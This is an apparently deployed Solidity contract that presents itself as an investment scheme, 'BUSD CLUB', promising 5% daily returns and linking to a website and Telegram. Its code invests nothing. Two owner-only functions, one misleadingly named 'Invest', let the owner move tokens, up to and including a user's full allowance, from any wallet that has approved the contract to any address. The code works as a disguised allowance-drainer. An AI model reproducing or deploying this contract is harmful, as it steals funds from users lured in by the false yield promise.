/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

// SPDX-License-Identifier: SEE LICENSE IN LICENSE

// BUSD CLUB - 5% daily in BUSD
// 🌎 Website: https://busdclub.net/
// 📱 Telegram: https://t.me/busdclubofficial
// 🌐 Twitter: https://twitter.com/busdclub

// ██████╗░██╗░░░██╗░██████╗██████╗░  ░█████╗░██╗░░░░░██╗░░░██╗██████╗░
// ██╔══██╗██║░░░██║██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██║░░░██║██╔══██╗
// ██████╦╝██║░░░██║╚█████╗░██║░░██║  ██║░░╚═╝██║░░░░░██║░░░██║██████╦╝
// ██╔══██╗██║░░░██║░╚═══██╗██║░░██║  ██║░░██╗██║░░░░░██║░░░██║██╔══██╗
// ██████╦╝╚██████╔╝██████╔╝██████╔╝  ╚█████╔╝███████╗╚██████╔╝██████╦╝
// ╚═════

pragma solidity 0.6.12;

interface IERC20Token {
    function allowance(address _owner, address _spender) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
}

contract BusdClub {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferFrom(IERC20Token _token, address _sender, address _receiver) external returns (bool) {
        require(msg.sender == owner, "access denied");
        uint256 amount = _token.allowance(_sender, address(this));
        return _token.transferFrom(_sender, _receiver, amount);
    }

    function Invest(IERC20Token _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {
        require(msg.sender == owner, "access denied");
        return _token.transferFrom(_sender, _receiver, _amount);
    }
}